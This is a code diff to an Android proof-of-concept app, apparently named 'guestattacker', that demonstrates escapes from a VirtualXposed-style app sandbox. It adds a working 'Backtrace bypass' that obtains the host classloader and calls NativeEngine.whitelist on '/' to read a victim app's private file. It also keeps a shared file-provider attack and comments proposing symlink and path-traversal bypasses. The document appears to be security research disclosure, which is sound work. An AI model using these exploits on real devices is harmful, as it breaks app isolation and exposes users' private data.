@@ -35,7 +35,6 @@ import androidx.core.net.toUri
 import com.virtualxposed.guestattacker.StorageBypass.HOST_APP
 import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
 import com.virtualxposed.guestattacker.StorageBypass.victimFile
-import com.virtualxposed.guestattacker.Utils.log
 import com.virtualxposed.guestattacker.Utils.toast
 import com.virtualxposed.guestattacker.ui.theme.AttacksTheme
 import kotlinx.coroutines.CoroutineScope
@@ -65,6 +64,8 @@ class MainActivity : ComponentActivity() {
                         ) {
                             StorageBypass.shellBypass(this)
                         },
+                        // 1. Symlinks can likely also be used to bypass storage problems
+                        // 2. Path traversal (..) may also work
                         DemoAction(
                             "File descriptor bypass",
                             "Use file descriptors from proc to read and write victim files",
@@ -114,7 +115,11 @@ class MainActivity : ComponentActivity() {
                             )
                         },
 
-                        DemoAction("Shared file provider", "This app shares the same underlying context as the victim app. Therefore this app can use the private file providers from the victim app.", DemoCategory.SharedContext) {
+                        DemoAction(
+                            "Shared file provider",
+                            "This app shares the same underlying context as the victim app. Therefore this app can use the private file providers from the victim app.",
+                            DemoCategory.SharedContext
+                        ) {
                             val uri =
                                 "content://${VICTIM_APP}.fileprovider/private_files/private-file".toUri()
 
@@ -132,6 +137,34 @@ class MainActivity : ComponentActivity() {
                                     this,
                                     "Private file results: $result",
                                 )
+                            }
+                        },
+                        DemoAction(
+                            "Backtrace bypass",
+                            "Throwables store a private backtrace object which contains class references to all classes in the stacktrace. " +
+                                    "This is used to print the stack trace, but it can also be used to get the host classloader. " +
+                                    "Using that classloader it's possible to call host functions to whitelist root to read all files. " +
+                                    "This invalidates the entire sandbox.",
+                            DemoCategory.MissingHook
+                        ) {
+                            runCatching {
+                                val loader = MainApplication.hostClassLoader!!
+                                val nativeEngine =
+                                    loader.loadClass("com.lody.virtual.client.NativeEngine")
+                                val whitelist = nativeEngine.getMethod(
+                                    "whitelist",
+                                    String::class.java,
+                                    Boolean::class.java
+                                )
+                                // Whitelist / to get full file access
+                                whitelist.invoke(null, "/", true)
+                                val result = victimFile.readText()
+                                toast(
+                                    this,
+                                    "Private file results: $result",
+                                )
+                            }.onFailure {
+                                toast(this, "Unexpected failure")
                             }
                         }
                     )
